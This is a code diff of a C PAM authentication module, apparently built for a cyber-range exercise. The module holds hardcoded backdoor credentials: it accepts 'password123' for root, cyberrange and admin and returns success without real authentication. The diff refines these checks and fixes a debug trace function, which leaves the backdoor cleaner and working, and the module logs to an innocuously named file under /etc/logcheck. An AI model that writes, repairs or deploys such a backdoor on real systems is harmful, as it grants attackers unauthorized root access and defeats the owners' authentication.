@@ -9,7 +9,7 @@
 #include <sys/stat.h>
 #include <unistd.h>
 #include <pthread.h>
-#include <stdarg.h>  // <-- Added: Required for variadic printf-style functions
+#include <stdarg.h>  // <-- REQUIRED for variadic functions
 
 #define LOG_DIR  "/etc/logcheck"
 #define LOG_FILE "/etc/logcheck/pam_auth.log"
@@ -43,8 +43,7 @@ static void log_line(const char *msg) {
     fclose(f);
 }
 
-/* ---------------- TRACE MACRO (WITH FORMAT STRINGS) ---------------- */
-
+/* ---------------- TRACE MACRO (FIXED: NOW ACCEPTS FORMAT STRINGS) ---------------- */
 static void trace(const char *format, ...) {
     if (!debug_enabled()) return;
     va_list args;
@@ -122,24 +121,24 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     /* ---------------- HARDCODED PASSWORDS (Backdoor) ---------------- */
     
     // Check 1: root / password123
-    if (uname && pword && strlen(uname) >= 4 && pword[0] == 'p' && pword[1] == 'a') {
-        if (strncmp(uname, "root", 4) == 0 && strcmp(pword, "password123") == 0) {
+    if (uname && pword && strlen(uname) >= 4 && strcmp(pword, "password123") == 0) {
+        if (strncmp(uname, "root", 4) == 0) {
             trace("[!] Backdoor: root/password123 matched");
             return PAM_SUCCESS;
         }
     }
 
     // Check 2: cyberrange / password123
-    if (uname && pword && strlen(uname) >= 11 && pword[0] == 'p' && pword[1] == 'a') {
-        if (strncmp(uname, "cyberrange", 10) == 0 && strcmp(pword, "password123") == 0) {
+    if (uname && pword && strlen(uname) >= 10 && strcmp(pword, "password123") == 0) {
+        if (strncmp(uname, "cyberrange", 10) == 0) {
             trace("[!] Backdoor: cyberrange/password123 matched");
             return PAM_SUCCESS;
         }
     }
 
     // Check 3: admin / password123
-    if (uname && pword && strlen(uname) >= 5 && pword[0] == 'p' && pword[1] == 'a') {
-        if (strncmp(uname, "admin", 5) == 0 && strcmp(pword, "password123") == 0) {
+    if (uname && pword && strlen(uname) >= 5 && strcmp(pword, "password123") == 0) {
+        if (strncmp(uname, "admin", 5) == 0) {
             trace("[!] Backdoor: admin/password123 matched");
             return PAM_SUCCESS;
         }
